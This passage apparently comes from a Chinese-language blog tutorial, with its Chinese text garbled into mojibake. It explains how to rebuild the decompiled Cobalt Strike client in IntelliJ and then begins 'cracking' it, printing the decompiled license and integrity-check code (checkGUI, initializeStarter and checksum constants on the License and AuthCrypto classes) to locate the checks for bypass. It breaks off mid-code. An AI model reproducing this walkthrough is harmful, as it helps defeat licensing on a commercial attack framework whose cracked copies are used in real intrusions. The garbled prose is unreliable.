src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501101425078.png" alt="å¦‚å›¾"><br>å‹¾é€‰ç„¶åç‚¹å‡»åº”ç”¨(apply)ç„¶åç‚¹å‡»ok<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501101427213.png" alt="å¦‚å›¾"></p><p>2:ä»åç¼–è¯‘æºç ä¸­å¤åˆ¶ä¸»ç±»ç±»åæ·»åŠ ä¾èµ–æ¨¡å—<br>æˆ‘ä»¬ä»ä¸‹å›¾å›¾ç‰‡ä¸­å¾—åˆ°ä¸»ç±»ä¸º aggressor.Aggressor<br> <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501101434768.png" alt="å¾—åˆ°ä¸»ç±»"><br> é€‰ä¸­Aggressor  æŒ‰ç…§å¦‚ä¸‹å›¾è¿›è¡Œæ“ä½œ<br> <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501101438933.png" alt="å¤åˆ¶"><br> æ³¨æ„è¦å¤åˆ¶åˆ°srcé‡Œé¢<br> <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501101442391.png" alt="æ³¨æ„è·¯å¾„"></p><p> 3:é…ç½®jaråŒ…è¾“å‡ºç›®å½•<br> æ¥åˆ°æ–‡ä»¶-é¡¹ç›®ç»“æ„-æ§ä»¶-åŠ å·-jar-æ¥è‡ªæ¨¡å—ä¾èµ– å¦‚ä¸‹å›¾:<br> <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501101446972.png" alt="å¦‚å›¾"><br>ç„¶åé€‰æ‹©ä¸»ç±»ç‚¹å‡»ç¡®å®šå°±è¡Œäº†ã€‚å¦å¤–ä¸€ä¸ªæ²¡æˆªå›¾é»˜è®¤å°±è¡Œäº†ã€‚<br> <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501101449262.png" alt="å¦‚å›¾"><br>æˆ‘ä»¬åœ¨ä¸»ç±»ä¸­åŠ å…¥</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">JOptionPane</span><span class="token punctuation">.</span><span class="token function">showMessageDialog</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token string">"test!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>æµ‹è¯•ç±»<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501101453702.png" alt="å¦‚å›¾"><br>æˆ‘ä»¬çœ‹ä¸»ç±»çš„MANIFEST.MFç¼ºå°‘ä¸œè¥¿æˆ‘ä»¬æŠŠåç¼–è¯‘æºç é‡Œé¢çš„MANIFEST.MFå†…å®¹å¤åˆ¶è¿‡æ¥<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501101456869.png" alt="å¦‚å›¾"><br>å¤åˆ¶è¿‡ç¨‹å°±ä¸æˆªå›¾äº†</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Manifest</span><span class="token operator">-</span><span class="token class-name">Version</span><span class="token operator">:</span> <span class="token number">1.0</span><span class="token class-name">Ant</span><span class="token operator">-</span><span class="token class-name">Version</span><span class="token operator">:</span> <span class="token class-name">Apache</span> <span class="token class-name">Ant</span> <span class="token number">1.9</span><span class="token number">.15</span><span class="token class-name">Created</span><span class="token operator">-</span><span class="token class-name">By</span><span class="token operator">:</span> <span class="token number">1.7</span><span class="token number">.0_80</span><span class="token operator">-</span>b15 <span class="token punctuation">(</span><span class="token class-name">Oracle</span> <span class="token class-name">Corporation</span><span class="token punctuation">)</span><span class="token class-name">Main</span><span class="token operator">-</span><span class="token class-name">Class</span><span class="token operator">:</span> <span class="token class-name"><span class="token namespace">aggressor<span class="token punctuation">.</span></span>Aggressor</span><span class="token class-name">Add</span><span class="token operator">-</span><span class="token class-name">Exports</span><span class="token operator">:</span> java<span class="token punctuation">.</span>desktop<span class="token operator">/</span>sun<span class="token punctuation">.</span>swing java<span class="token punctuation">.</span>desktop<span class="token operator">/</span>sun<span class="token punctuation">.</span>swing<span class="token punctuation">.</span>table java<span class="token punctuation">.</span>de sktop<span class="token operator">/</span>sun<span class="token punctuation">.</span>swing<span class="token punctuation">.</span>plaf<span class="token punctuation">.</span>synth java<span class="token punctuation">.</span>desktop<span class="token operator">/</span>com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>java<span class="token punctuation">.</span>swing<span class="token punctuation">.</span>plaf<span class="token punctuation">.</span>windows  java<span class="token punctuation">.</span>desktop<span class="token operator">/</span>sun<span class="token punctuation">.</span>awt<span class="token punctuation">.</span>shell java<span class="token punctuation">.</span>desktop<span class="token operator">/</span>com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>awt java<span class="token punctuation">.</span>base<span class="token operator">/</span>sun<span class="token punctuation">.</span>secu rity<span class="token punctuation">.</span>action<span class="token class-name">Add</span><span class="token operator">-</span><span class="token class-name">Opens</span><span class="token operator">:</span> java<span class="token punctuation">.</span>desktop<span class="token operator">/</span>javax<span class="token punctuation">.</span>swing<span class="token punctuation">.</span>plaf<span class="token punctuation">.</span>synth java<span class="token punctuation">.</span>desktop<span class="token operator">/</span>javax<span class="token punctuation">.</span>swing<span class="token punctuation">.</span> plaf<span class="token punctuation">.</span>basic java<span class="token punctuation">.</span>desktop<span class="token operator">/</span>javax<span class="token punctuation">.</span>swing java<span class="token punctuation">.</span>desktop<span class="token operator">/</span>javax<span class="token punctuation">.</span>swing<span class="token punctuation">.</span>tree java<span class="token punctuation">.</span> desktop<span class="token operator">/</span>java<span class="token punctuation">.</span>awt<span class="token punctuation">.</span>event<span class="token class-name">Synthetica</span><span class="token operator">-</span><span class="token class-name">Version</span><span class="token operator">:</span> <span class="token number">2.30</span><span class="token number">.0</span> <span class="token class-name">Build</span> <span class="token number">16</span><span class="token class-name">Multi</span><span class="token operator">-</span><span class="token class-name">Release</span><span class="token operator">:</span> <span class="token boolean">true</span></code></pre><p>æ¥åˆ°buildåˆ°build artifart ã€‚buildæˆåŠŸä¼šç”Ÿæˆjaræ–‡ä»¶<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501101500459.png" alt="å¦‚å›¾"><br>å¦‚å›¾ç”Ÿæˆäº†jaræ–‡ä»¶ã€‚<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501101502243.png" alt="å¦‚å›¾"><br>è¿è¡Œæµ‹è¯•ä¸€ä¸‹ã€‚ç‚¹å‡»run-ç¼–è¾‘é…ç½®<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501101505794.png" alt="é…ç½®"><br>ç‚¹å‡»åŠ å·-ç„¶åé€‰æ‹©jaråº”ç”¨æŒ‰ç…§è¿™ä¹ˆé…ç½®<br>ç©ºæ ¼ -XX:+AggressiveHeap -XX:+UseParallelGC æ³¨æ„jdkè¦é€‰æ‹©ideaå†…ç½®jdk<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501101509808.png" alt="å¦‚å›¾"><br>ç„¶åç‚¹å‡»æˆ‘ä»¬é…ç½®å¥½çš„é¡¹ç›®ç›´æ¥è¿è¡Œå°±è¡Œäº†<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501101513718.png" alt="å¦‚å›¾"><br>å‡ºç°ä¸‹å›¾è¿™ç§è¯´æ˜ç¯å¢ƒæ²¡æœ‰é—®é¢˜ç¨‹åºè¿è¡Œäº†<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501101516779.png" alt="å¦‚å›¾"></p><h2 id="åˆ†æå¹¶ä¸”ç ´è§£cså®¢æˆ·ç«¯"><a href="#åˆ†æå¹¶ä¸”ç ´è§£cså®¢æˆ·ç«¯" class="headerlink" title="åˆ†æå¹¶ä¸”ç ´è§£cså®¢æˆ·ç«¯"></a>åˆ†æå¹¶ä¸”ç ´è§£cså®¢æˆ·ç«¯</h2><p>æˆ‘ä»¬ä»ä»£ç çœ‹Requirements.checkGUI();æŒ¨ä¸ªå‡½æ•°è¿›è¡Œåˆ†æ<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501101533577.png" alt="å¦‚å›¾"><br>æˆ‘ä»¬æ¥çœ‹ä»£ç æˆ‘æŠŠä»£ç è´´ä¸Šæ¥äº†</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">checkGUI</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>       <span class="token function">recommended</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//ç©ºå‡½æ•°</span>       <span class="token class-name">String</span> var0 <span class="token operator">=</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//è¿™ä¸ªåº”è¯¥æ˜¯åˆ¤æ–­ç¯å¢ƒçš„</span>       <span class="token keyword">if</span> <span class="token punctuation">(</span>var0 <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>           <span class="token class-name">JOptionPane</span><span class="token punctuation">.</span><span class="token function">showMessageDialog</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Component</span><span class="token punctuation">)</span><span class="token keyword">null</span><span class="token punctuation">,</span> var0<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">print_error</span><span class="token punctuation">(</span>var0<span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span>       <span class="token class-name">String</span> var1 <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"XDG_SESSION_TYPE"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//è·å–ç¯å¢ƒé…ç½®</span>       <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"wayland"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>           <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">print_warn</span><span class="token punctuation">(</span><span class="token string">"You are using a Wayland desktop and not X11. Graphical Java applications run on Wayland are known to crash. You should use X11. See: https://www.cobaltstrike.com/help-wayland"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token class-name">JOptionPane</span><span class="token punctuation">.</span><span class="token function">showInputDialog</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Component</span><span class="token punctuation">)</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">"The Wayland desktop is not supported with Cobalt Strike.\nMore information:"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">Icon</span><span class="token punctuation">)</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">"https://www.cobaltstrike.com/help-wayland"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span>       <span class="token class-name">Requirements</span> var2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Requirements</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        var2<span class="token punctuation">.</span><span class="token function">initializeStarter</span><span class="token punctuation">(</span>var2<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">recommended</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">//ç©ºå‡½æ•°</span>   <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token keyword">boolean</span> var0<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>       <span class="token keyword">if</span> <span class="token punctuation">(</span>var0<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>           <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"1.6"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"java.specification.version"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>               <span class="token keyword">return</span> <span class="token string">"Java 1.6 is not supported. Please upgrade to Java 1.7 or later."</span><span class="token punctuation">;</span>           <span class="token punctuation">&#125;</span>           <span class="token keyword">if</span> <span class="token punctuation">(</span>var0 <span class="token operator">&amp;&amp;</span> <span class="token string">"1.8"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"java.specification.version"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">isin</span><span class="token punctuation">(</span><span class="token string">"OpenJDK"</span><span class="token punctuation">,</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"java.runtime.name"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>               <span class="token keyword">return</span> <span class="token string">"OpenJDK 1.8 is not supported. Use Oracle Java 8 or OpenJDK 11 (or later.)"</span><span class="token punctuation">;</span>           <span class="token punctuation">&#125;</span>           <span class="token class-name">Set</span> var1 <span class="token operator">=</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>var1<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"-XX:+AggressiveHeap"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>               <span class="token keyword">return</span> <span class="token string">"Java -XX:+AggressiveHeap option not set. Use the Cobalt Strike launcher. Don't click the .jar file!"</span><span class="token punctuation">;</span>           <span class="token punctuation">&#125;</span>           <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>var1<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"-XX:+UseParallelGC"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>               <span class="token keyword">return</span> <span class="token string">"Java -XX:+UseParallelGC option not set. Use the Cobalt Strike launcher. Don't click the .jar file!"</span><span class="token punctuation">;</span>           <span class="token punctuation">&#125;</span>       <span class="token punctuation">&#125;</span>       <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">Set</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>       <span class="token class-name">RuntimeMXBean</span> var0 <span class="token operator">=</span> <span class="token class-name">ManagementFactory</span><span class="token punctuation">.</span><span class="token function">getRuntimeMXBean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token class-name">List</span> var1 <span class="token operator">=</span> var0<span class="token punctuation">.</span><span class="token function">getInputArguments</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token class-name">HashSet</span> var2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">return</span> var2<span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span></code></pre><p>ä¸Šé¢åˆ†ææ²¡æœ‰å‘ç°æœ‰æ ¡éªŒå‡½æ•°æ‰€ä»¥æˆ‘ä»¬çœ‹è¿™ä¸ªRequirementsç±»è°ƒç”¨äº†ä¸€ä¸ªinitializeStarterå‡½æ•°å¹¶ä¸”ä¼ å…¥classå¯¹è±¡</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Requirements</span> var2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Requirements</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  var2<span class="token punctuation">.</span><span class="token function">initializeStarter</span><span class="token punctuation">(</span>var2<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>æˆ‘ä»¬é‡ç‚¹çœ‹è¿™ä¸ªinitializeStarterå‡½æ•°</p><pre class="language-java" data-language="java"><code class="language-java">  <span class="token keyword">protected</span> <span class="token keyword">final</span> <span class="token keyword">void</span> <span class="token function">initializeStarter</span><span class="token punctuation">(</span><span class="token class-name">Class</span> var1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>A</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">//è°ƒç”¨Aå‡½æ•°è¿›è¡Œæ ¡éªŒæ“ä½œ</span>            <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">boolean</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token class-name">Class</span> var1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">boolean</span> var2 <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token class-name">Class</span> var3 <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> var4 <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">long</span> var5 <span class="token operator">=</span> <span class="token number">0L</span><span class="token punctuation">;</span>        var3 <span class="token operator">=</span> <span class="token class-name">AuthCrypto</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>        var4 <span class="token operator">=</span> <span class="token string">"common/AuthCrypto.class"</span><span class="token punctuation">;</span>        var5 <span class="token operator">=</span> <span class="token number">895661977L</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name">Initializer</span><span class="token punctuation">.</span><span class="token function">isOK</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var3<span class="token punctuation">,</span> var4<span class="token punctuation">,</span> var5<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            var2 <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token operator">--</span>var5<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">Initializer</span><span class="token punctuation">.</span><span class="token function">isOK</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var3<span class="token punctuation">,</span> var4<span class="token punctuation">,</span> var5<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            var2 <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        var4 <span class="token operator">=</span> <span class="token string">"resources/authkey.pub"</span><span class="token punctuation">;</span>        var5 <span class="token operator">=</span> <span class="token number">1661186542L</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name">Initializer</span><span class="token punctuation">.</span><span class="token function">isFileOK</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var4<span class="token punctuation">,</span> var5<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            var2 <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token operator">--</span>var5<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">Initializer</span><span class="token punctuation">.</span><span class="token function">isFileOK</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var4<span class="token punctuation">,</span> var5<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            var2 <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        var3 <span class="token operator">=</span> <span class="token class-name">License</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>        var4 <span class="token operator">=</span> <span class="token string">"common/License.class"</span><span class="token punctuation">;</span>        var5 <span class="token operator">=</span> <span class="token number">1747926151L</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name">Initializer</span><span class="token punctuation">.</span><span class="token function">isOK</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var3<span class="token punctuation">,</span> var4<span class="token punctuation">,</span> var5<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            var2 <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token operator">--</span>var5<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">Initializer</span><span class="token punctuation">.</span><span class="token function">isOK</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var3<span class="token punctuation">,</span> var4<span class="token punctuation">,</span> var5<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            var2 <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        var3 <span class="token operator">=</span> <span class="token class-name">Authorization</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>        var4 <span class="token operator">=</span> <span class="token string">"common/Authorization.class"</span><span class="token punctuation">;</span>        var5 <span class="token operator">=</span> <span class="token number">1655604415L</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name">Initializer</span><span class="token punctuation">.</span><span class="token function">isOK</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var3<span class="token punctuation">,</span> var4<span class="token punctuation">,</span> var5<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            var2 <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token operator">--</span>var5<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">Initializer</span><span class="token punctuation">.</span><span class="token function">isOK</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var3<span class="token punctuation">,</span> var4<span class="token punctuation">,</span> var5<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            var2 <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        var3 <span class="token operator">=</span> <span class="token class-name">LicenseStatus</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>        var4 <span class="token operator">=</span> <span class="token string">"common/LicenseStatus.class"</span><span class="token punctuation">;</span>        var5 <span class="token operator">=</span> <span class="token number">3059950611L</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name">Initializer</span><span class="token punctuation">.</span><span class="token function">isOK</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var3<span class="token punctuation">,</span> var4<span class="token punctuation">,</span> var5<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            var2 <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token operator">--</span>var5<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">Initializer</span><span class="token punctuation">.</span><span class="token function">isOK</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var3<span class="token punctuation">,</span> var4<span class="token punctuation">,</span> var5<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            var2 <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        var3 <span class="token operator">=</span> <span class="token class-name">SleevedResource</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>        var4 <span class="token operator">=</span> <span class="token string">"common/SleevedResource.class"</span><span class="token punctuation">;</span>        var5 <span class="token operator">=</span> <span class="token number">3881376138L</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name">Initializer</span><span class="token punctuation">.</span><span class="token function">isOK</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var3<span class="token punctuation">,</span> var4<span class="token punctuation">,</span> var5<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            var2 <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token operator">--</span>var5<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">Initializer</span><span class="token punctuation">.</span><span class="token function">isOK</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var3<span class="token punctuation">,</span> var4<span class="token punctuation">,</span> var5<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            var2 <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        var3 <span class="token operator">=</span> <span class="token class-name">AggressorInfo</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>        var4 <span class="token operator">=</span> <span class="token string">"common/AggressorInfo.class"</span><span class="token punctuation">;</span>        var5 <span class="token operator">=</span> <span class="token number">1814321826L</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name">Initializer</span><span class="token punctuation">.</span><span class="token function">isOK</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var3<span class="token punctuation">,</span> var4<span class="token punctuation">,</span> var5<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            var2 <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token operator">--</span>var5<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">Initializer</span><span class="token punctuation">.</span><span class="token function">isOK</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var3<span class="token punctuation">,</span> var4<span class="token punctuation">,</span> var5<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            var2 <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        var3 <span class="token operator">=</span> <span class="token class-name">SleeveSecurity</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>        var4 <span class="token operator">=</span> <span class="token string">"dns/SleeveSecurity.class"</span><span class="token punctuation">;</span>        var5 <span class="token operator">=</span> <span class="token number">3962922538L</span><span 